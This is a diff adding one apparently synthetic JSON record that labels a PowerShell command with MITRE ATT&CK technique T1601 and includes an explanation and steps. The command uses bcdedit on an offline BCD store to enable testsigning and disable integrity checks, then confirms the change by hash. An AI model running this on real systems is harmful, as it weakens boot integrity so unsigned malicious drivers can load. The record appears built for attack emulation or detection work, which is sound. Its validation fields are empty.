@@ -1,0 +1,23 @@
+{
+  "technique_id": "T1601",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "$before=(Get-FileHash 'C:\\mount\\Boot\\BCD' -Algorithm SHA256).Hash; bcdedit /store C:\\mount\\Boot\\BCD /set {default} testsigning on; bcdedit /store C:\\mount\\Boot\\BCD /set {default} nointegritychecks on; $after=(Get-FileHash 'C:\\mount\\Boot\\BCD' -Algorithm SHA256).Hash; if($before -ne $after){Write-Output 'BCD altered for unsigned code'}; certutil -hashfile C:\\mount\\Boot\\BCD SHA256",
+  "explanation": "Modifies the offline BCD store in the system image to permit unsigned code and verifies the alteration via hash comparison, an example of system image patching consistent with T1601.",
+  "rationale_steps": [
+    "Hash the offline BCD store as a baseline.",
+    "Set testsigning and disable integrity checks in the BCD of the image.",
+    "Re-hash to confirm the change.",
+    "Log the BCD hash with certutil for records."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1601-dc7ef01c-05eb2350",
+  "source_prompt_hash": "dc7ef01c",
+  "timestamp_utc": "2025-09-30T04:49:19.161651Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
